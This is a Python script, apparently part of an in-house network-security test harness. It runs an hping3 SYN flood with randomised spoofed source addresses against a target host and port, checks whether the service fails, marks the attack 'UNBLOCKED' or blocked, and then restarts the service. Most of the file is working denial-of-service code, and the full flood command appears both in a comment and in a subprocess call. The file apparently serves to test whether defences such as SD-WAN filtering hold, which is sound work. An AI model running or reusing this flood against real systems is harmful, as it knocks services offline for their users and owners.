#!/usr/bin/python3

import subprocess
import sys
import time
import os

# installed packages
from pwn import *
import argparse

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_services_check
import pre_attacks
import pre_services_restart

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

def exploit(rhost, rport, attacks, packet_count, data_size):
    hping_process = None  # Initialize to ensure cleanup happens
    stdout, stderr = None, None  # Prevent potential UnboundLocalError

    try:
        status_ping = pre_ping_check.check(rhost)
        status_service_pre = pre_services_check.check(rhost, rport)

        if not status_service_pre:
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre:
            # packet_count = 1 # max 65535 -> change this is no blocking on SDWAN
            # data_size = 1 # max 65495 -> change this is no blocking on SDWAN

            try:
                # sudo hping3 -S --flood --rand-source -p 80 -c 65535 -d 65495 -q -n 10.251.5.5
                hping_process = subprocess.Popen([pre_settings.SUDO_PATH, pre_settings.HPING_PATH, '-S', '--flood', '--rand-source', '-p', str(rport), '-c', str(packet_count), '-d', str(data_size), '-q', '-n', rhost], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                try:
                    # Wait for 2 seconds to start attack and ensure it's running
                    stdout, stderr = hping_process.communicate(timeout=10)
                except subprocess.TimeoutExpired:
                    log.info("SYN flood initiated. Monitoring target service...")
                    # Allow SYN flood to continue for 15 seconds
                    time.sleep(15)

                # check service
                # sudo /usr/sbin/tcpdump -Nnn -i any -s0 'tcp[13] & 2 != 0' -> to check SYN flag in tcpdump
                status_service_post = pre_services_check.check(rhost, rport)
                status_attack = not status_service_post

                if status_attack:
                    attacks['status (attack)'] = 'UNBLOCKED'
                    attacks['remark'] = pre_attacks.success_dos
                else:
                    attacks['remark'] = pre_attacks.fail_dos

                print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
                
                return attacks

            except (FileNotFoundError, ValueError, PermissionError) as e:
                log.error(str(e))
                sys.exit(1)

            except (subprocess.SubprocessError, subprocess.TimeoutExpired, pwnlib.exception.PwnlibException, Exception) as e:
                log.error(str(e))
                sys.exit(1)
            
            finally:
                # Ensure the process is terminated
                if hping_process and hping_process.poll() is None:
                    hping_process.terminate()
                    hping_process.wait()  # Wait for the process to clean up
                    
                # cleanup and restart the service
                time.sleep(2)
                log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check(rhost, rport), 'cleanup'))
                status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
                
        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))
            
            return attacks

    except KeyboardInterrupt:
        sys.exit(0)

def main():
    try:
        attacks = pre_attacks.attacks.get('dos_syn')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5 --packet 1 (min:1/max:65535) --data 1 (min:1/max:65495)")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        parser.add_argument('--packet', help='Number of packet count', default=1, type=int)
        parser.add_argument('--data', help='Number of data size', default=1, type=int)
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']
        packet_count = args.packet
        data_size = args.data

        exploit(rhost, rport, attacks, packet_count, data_size)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()